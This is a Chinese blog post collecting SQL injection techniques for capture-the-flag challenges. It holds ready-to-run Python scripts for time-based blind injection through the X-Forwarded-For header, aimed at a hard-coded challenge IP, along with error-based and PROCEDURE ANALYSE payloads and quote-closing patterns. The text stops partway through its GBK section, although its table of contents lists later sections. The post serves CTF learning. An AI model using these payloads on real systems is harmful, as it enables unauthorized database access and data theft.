<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="0x01 http头xff的时间盲注题目代码如下，从题目分析可以看到$ip是从xxf参数中获取的，并再使用explode函数处理后(注意在这里使用了,号作为分隔符，因而我们插入的sql语句中不能出现,号了)，直接代入sql语句，因而是存在sql注入漏洞。因为关闭了报错，因而只能采用时间盲注的方式。 因为,号不能使用，所以就意味着limit 0,1不能使用，但是可以使用from 0 for 1进行代">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF中的SQLi">
<meta property="og:url" content="http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/index.html">
<meta property="og:site_name" content="Z3R0YU">
<meta property="og:description" content="0x01 http头xff的时间盲注题目代码如下，从题目分析可以看到$ip是从xxf参数中获取的，并再使用explode函数处理后(注意在这里使用了,号作为分隔符，因而我们插入的sql语句中不能出现,号了)，直接代入sql语句，因而是存在sql注入漏洞。因为关闭了报错，因而只能采用时间盲注的方式。 因为,号不能使用，所以就意味着limit 0,1不能使用，但是可以使用from 0 for 1进行代">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2018-11-24T12:40:01.918Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CTF中的SQLi">
<meta name="twitter:description" content="0x01 http头xff的时间盲注题目代码如下，从题目分析可以看到$ip是从xxf参数中获取的，并再使用explode函数处理后(注意在这里使用了,号作为分隔符，因而我们插入的sql语句中不能出现,号了)，直接代入sql语句，因而是存在sql注入漏洞。因为关闭了报错，因而只能采用时间盲注的方式。 因为,号不能使用，所以就意味着limit 0,1不能使用，但是可以使用from 0 for 1进行代">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>CTF中的SQLi</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml">
    
</head>

<body class="max-width mx-auto px3 ltr">    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/03/06/wordpress-5-0-0-rce-aanalysis/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/11/23/2018-The-Second-HNCyber-Web-writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&text=CTF中的SQLi"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&title=CTF中的SQLi"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&is_video=false&description=CTF中的SQLi"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTF中的SQLi&body=Check out this article: http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&title=CTF中的SQLi"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&title=CTF中的SQLi"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&title=CTF中的SQLi"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&title=CTF中的SQLi"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/&name=CTF中的SQLi&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-http头xff的时间盲注"><span class="toc-number">1.</span> <span class="toc-text">0x01 http头xff的时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-异或注入xor"><span class="toc-number">2.</span> <span class="toc-text">0x02 异或注入xor/^</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-limit注入"><span class="toc-number">3.</span> <span class="toc-text">0x03 limit注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-利用insert，update和delete注入获取数据"><span class="toc-number">4.</span> <span class="toc-text">0x04 利用insert，update和delete注入获取数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05当update注入遇到关闭显错"><span class="toc-number">5.</span> <span class="toc-text">0x05当update注入遇到关闭显错</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Mysql字符编码利用技巧"><span class="toc-number">6.</span> <span class="toc-text">0x06 Mysql字符编码利用技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-GBK-Injection"><span class="toc-number">7.</span> <span class="toc-text">0x07 GBK Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-MD5加密后的SQLi"><span class="toc-number">8.</span> <span class="toc-text">0x08 MD5加密后的SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-空格被过滤"><span class="toc-number">9.</span> <span class="toc-text">0x09 空格被过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-符号问题"><span class="toc-number">10.</span> <span class="toc-text">0x10 符号问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-rollup-amp-amp-offset"><span class="toc-number">11.</span> <span class="toc-text">0x11 rollup&amp;&amp;offset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-注出可控数据绕过登录"><span class="toc-number">12.</span> <span class="toc-text">0x12 注出可控数据绕过登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-htmlentities实体化单引号情况"><span class="toc-number">13.</span> <span class="toc-text">0x13 htmlentities实体化单引号情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-报错注入-amp-amp-00000select-amp-amp-‘-gt-x27"><span class="toc-number">14.</span> <span class="toc-text">0x14 报错注入 &amp;&amp; /!00000select/ &amp;&amp; ‘-&gt;\x27</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-利用updatexml报错"><span class="toc-number">14.1.</span> <span class="toc-text">1.利用updatexml报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-利用ExtractValue-报错"><span class="toc-number">14.2.</span> <span class="toc-text">2.利用ExtractValue()报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-name-const"><span class="toc-number">14.3.</span> <span class="toc-text">3.name_const()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-exp"><span class="toc-number">14.4.</span> <span class="toc-text">4.exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-主键重复"><span class="toc-number">14.5.</span> <span class="toc-text">5.主键重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-几何函数"><span class="toc-number">14.6.</span> <span class="toc-text">6.几何函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-join报错爆字段"><span class="toc-number">14.7.</span> <span class="toc-text">7.join报错爆字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-MySQL快速盲注小技巧"><span class="toc-number">15.</span> <span class="toc-text">0x15 MySQL快速盲注小技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x16-update注入"><span class="toc-number">16.</span> <span class="toc-text">0x16 update注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x17-00截断"><span class="toc-number">17.</span> <span class="toc-text">0x17 %00截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x18-绕正则"><span class="toc-number">18.</span> <span class="toc-text">0x18 绕正则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00-参考文章"><span class="toc-number">19.</span> <span class="toc-text">00.参考文章</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CTF中的SQLi
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Z3R0YU</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-11-24T10:01:30.000Z" itemprop="datePublished">2018-11-24</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x01-http头xff的时间盲注"><a href="#0x01-http头xff的时间盲注" class="headerlink" title="0x01 http头xff的时间盲注"></a>0x01 http头xff的时间盲注</h2><p>题目代码如下，从题目分析可以看到$ip是从xxf参数中获取的，并再使用explode函数处理后(注意在这里使用了,号作为分隔符，因而我们插入的sql语句中不能出现,号了)，直接代入sql语句，因而是存在sql注入漏洞。因为关闭了报错，因而只能采用时间盲注的方式。</p>
<p>因为,号不能使用，所以就意味着limit 0,1不能使用，但是可以使用from 0 for 1进行代替；if判断在此处不能使用了，但是可以使用select case when（满足条件）then（语句1）else（语句2） end语句进行代替</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>
<p>数据库名的注入脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr(database() from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</span><br><span class="line">            database = database + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of database is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'database:'</span>,database)</span><br></pre></td></tr></table></figure>
<p>注入表名的代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">table_name = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            table_name = table_name + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'table_name:'</span>,table_name)</span><br></pre></td></tr></table></figure>
<p>注入得到列名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">column_name = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag') from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            column_name = column_name + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'column_name:'</span>,column_name)</span><br></pre></td></tr></table></figure>
<p>最终注入得到列中的数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">f = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select flag from flag) from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            f = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'flag:'</span>,flag)</span><br></pre></td></tr></table></figure>
<h2 id="0x02-异或注入xor"><a href="#0x02-异或注入xor" class="headerlink" title="0x02 异或注入xor/^"></a>0x02 异或注入xor/^</h2><p>xor与^的区别：前者是做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据；后者是做位异或运算 如1^2=3 1^2=3</p>
<p>可以采用这种方式来判断目标站点过滤了什么关键字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=1&apos;^(length(&apos;union&apos;)=5)%23</span><br><span class="line">当union被过滤时1^0 输出id=1</span><br><span class="line">当union没被过滤时 1 ^ 1 输出 id=0 并回显 error</span><br></pre></td></tr></table></figure>
<h2 id="0x03-limit注入"><a href="#0x03-limit注入" class="headerlink" title="0x03 limit注入"></a>0x03 limit注入</h2><p>在MySQL5.x版本中，后端采用如下形式进行SQL查询，此时注入点在order by语句后面无法使用union进行联合查询，因而需要另辟蹊径。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 【注入点】</span><br></pre></td></tr></table></figure></p>
<p>在此处我们可以使用procedure关键字调用ANALYSE存储过程来完成注入。利用姿势有以下几种：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//1.报错注入</span><br><span class="line">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class="line"> </span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5.41-0ubuntu0.14.04.1&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT host FROM mysql.user ORDER BY 1 LIMIT 0 PROCEDURE ANALYSE (0, (SELECT 3 ORDER BY updatexml(1, concat(0x3A, version()), 1)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//2.时间盲注，注意此时不能使用sleep</span><br><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br><span class="line"></span><br><span class="line">//注:以上出现version()的地方都可以用想用的SQL语句替换</span><br></pre></td></tr></table></figure>
<h2 id="0x04-利用insert，update和delete注入获取数据"><a href="#0x04-利用insert，update和delete注入获取数据" class="headerlink" title="0x04 利用insert，update和delete注入获取数据"></a>0x04 利用insert，update和delete注入获取数据</h2><p>闭合形式:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&apos; or (payload) or &apos;</span><br><span class="line">&apos; and (payload) and &apos;</span><br><span class="line">&apos; or (payload) and &apos;</span><br><span class="line">&apos; or (payload) and &apos;=&apos;</span><br><span class="line">&apos;* (payload) *&apos;</span><br><span class="line">&apos; or (payload) and &apos;</span><br><span class="line">&quot; – (payload) – &quot;</span><br></pre></td></tr></table></figure>
<p>利用方式:</p>
<ol>
<li>利用updatexml()获取数据</li>
<li>利用extractvalue()获取数据</li>
<li><p>利用name_const()获取数据</p>
<p> 注意：</p>
<blockquote>
<p>如果显示ERROR 1210 (HY000): Incorrect arguments to NAME_CONST，那就洗洗睡吧。。</p>
</blockquote>
</li>
</ol>
<blockquote>
<p>如果显示ERROR 1060 (42S21): Duplicate column name ‘2’，就可以进一步获取更多数据。</p>
<ol start="4">
<li>利用子查询注入</li>
</ol>
</blockquote>
<p>参考:<a href="http://wooyun.jozxing.cc/static/drops/tips-2078.html" target="_blank" rel="noopener">利用insert，update和delete注入获取数据</a></p>
<h2 id="0x05当update注入遇到关闭显错"><a href="#0x05当update注入遇到关闭显错" class="headerlink" title="0x05当update注入遇到关闭显错"></a>0x05当update注入遇到关闭显错</h2><p>注:此处提到的或逻辑运算对insert注入也是有效的</p>
<p>参考:</p>
<p><a href="https://blog.spoock.com/2018/06/02/update-sqli-without-error/" target="_blank" rel="noopener">当update注入遇到关闭显错</a></p>
<p><a href="http://godot.win/index.php/archives/9/" target="_blank" rel="noopener">在Update的注入中如果关闭了显错该怎么办</a></p>
<h2 id="0x06-Mysql字符编码利用技巧"><a href="#0x06-Mysql字符编码利用技巧" class="headerlink" title="0x06 Mysql字符编码利用技巧"></a>0x06 Mysql字符编码利用技巧</h2><p>latin1编码不支持汉字，因而可以采用编码绕过</p>
<p>参考:<br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">《Mysql字符编码利用技巧》</a></p>
<h2 id="0x07-GBK-Injection"><a href="#0x07-GBK-Injection" class="headerlink" title="0x07 GBK Injection"></a>0x07 GBK Injection</h2><p>单引号会被/注掉，可以用%df吃掉/封闭id</p>
<p>查询字段数</p>
